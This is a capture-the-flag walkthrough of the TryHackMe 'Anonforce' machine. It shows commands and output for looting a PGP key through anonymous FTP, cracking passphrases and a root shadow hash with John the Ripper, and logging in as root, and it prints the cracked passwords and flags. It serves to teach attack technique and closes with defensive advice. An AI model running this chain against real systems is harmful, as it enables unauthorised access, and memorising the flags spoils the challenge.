### [Anonforce] - [TryHackMe] Walkthrough

#### 1. Challenge Overview
**Name:** Anonforce  
**Category:** Boot2Root / Linux  
**Difficulty:** Easy  
**Points/Reward:** N/A  
**Challenge Prompt:** 
> boot2root machine for FIT and bsides guatemala CTF. Read user.txt and root.txt.

---

#### 2. Setup & Enumeration

**Initial Assessment:** 
The target IP was `10.49.188.234`. My first impression was that the service configuration would be the key, as the name "Anonforce" suggested either Anonymous access or a Brute-force requirement.

**Reconnaissance Tools:**

```bash
# Comprehensive service and script scan
nmap -sC -sV -oN nmap_initial.txt 10.49.188.234
```

**Terminal Output:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jun 06 06:28 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

**Secondary Enumeration:**
The FTP server was misconfigured to allow anonymous users to view the **entire root filesystem (/)**. I immediately looked for sensitive directories like `/etc` and the custom `/notread` directory.

**Key Findings:**
*   **Finding 1:** Anonymous FTP login is enabled and maps to the root (`/`) directory.
*   **Finding 2:** `/notread` is world-writable and contains PGP encrypted files.
*   **Finding 3:** `/etc/passwd` was accessible, confirming the user `melodias`.

---

#### 3. Misleading Paths & Failed Attempts
*   **[Misleading Path 1]**: Direct Shadow Access.
*   **[Why it failed]**: Despite the root directory listing, the file permissions on `/etc/shadow` prevented the `ftp` user from reading it directly.
*   **[Misleading Path 2]**: SSH Brute-force.
*   **[Why it failed]**: This is an "Easy" box; the intended path was the cryptographic challenge found in the FTP files.

---

#### 4. Exploitation & Solution

**The Vulnerability:** 
Information Disclosure via FTP. The server exposes a PGP private key and an encrypted backup file. By cracking the PGP key's passphrase, we can decrypt the backup, which contains the system's password hashes.

**Step-by-Step Execution:**

1. **[Exfiltrating Secrets]**: Downloaded the PGP files and the passwd file.
    ```bash
    wget -r ftp://anonymous:anonymous@10.49.188.234/notread/
    ```

2. **[Cracking PGP Passphrase]**: Extracted the hash from `private.asc` and cracked it.
    ```bash
    gpg2john private.asc > gpg.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
    ```
    **Terminal Output:**
    ```text
    xbox360          (anonforce)
    ```

3. **[Decrypting the Backup]**: Used the passphrase to decrypt `backup.pgp`, revealing the shadow file.
    ```bash
    gpg --batch --import private.asc # Enter xbox360 when prompted
    gpg --decrypt backup.pgp > backup.txt
    ```

---

#### 5. Post-Exploitation / Privilege Escalation

**Internal Enumeration:**
The decrypted `backup.txt` was a copy of `/etc/shadow`. It contained a SHA-512 crypt hash for the `root` user.

**Privilege Escalation to Root:**
Used John the Ripper to crack the root hash found in the decrypted backup.

**Terminal Output:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.txt
# Output: hikari (root)
```

**Final Access:**
Logged in via SSH as root using the password `hikari`.

```bash
ssh root@10.49.188.234
```

---

#### 6. The Flag

**User Flag:** 
`606083fd33beb1284fc51f411a706af8`

**Root Flag:** 
`f706456440c7af4187810c31c6cebdce`

---

#### 7. Takeaways & Conclusion

*   **[Key Concept 1]**: **FTP Root Exposure.** Never configure an FTP root to point to the system root `/`.
*   **[Key Concept 2]**: **PGP Key Management.** Storing a private key (even a protected one) alongside encrypted backups is a high-risk practice.
*   **[Defense Recommendation]**: Restrict FTP to a dedicated, jailed directory (chroot). Ensure sensitive system files like `/etc/shadow` are never backed up to world-accessible locations.
